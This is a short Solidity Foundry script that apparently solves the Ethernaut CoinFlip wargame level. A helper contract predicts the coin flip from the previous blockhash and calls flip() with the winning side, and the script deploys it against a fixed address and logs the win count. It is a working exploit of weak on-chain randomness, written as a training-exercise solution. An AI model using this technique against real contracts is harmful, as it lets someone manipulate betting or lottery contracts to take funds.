// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {CoinFlip} from "../src/CoinFlip.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract CoinFlipHack {
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _coinFlipContract) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        _coinFlipContract.flip(side);
    }
}

contract CoinFlipSolution is Script {
    CoinFlip public coinFlipContract =
        CoinFlip(payable(0xdeBDBC30B5746e9B1C60543ad48b4B2e71f4fB6C));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new CoinFlipHack(coinFlipContract);
        console.log("Wins :", coinFlipContract.consecutiveWins());
        vm.stopBroadcast();
    }
}
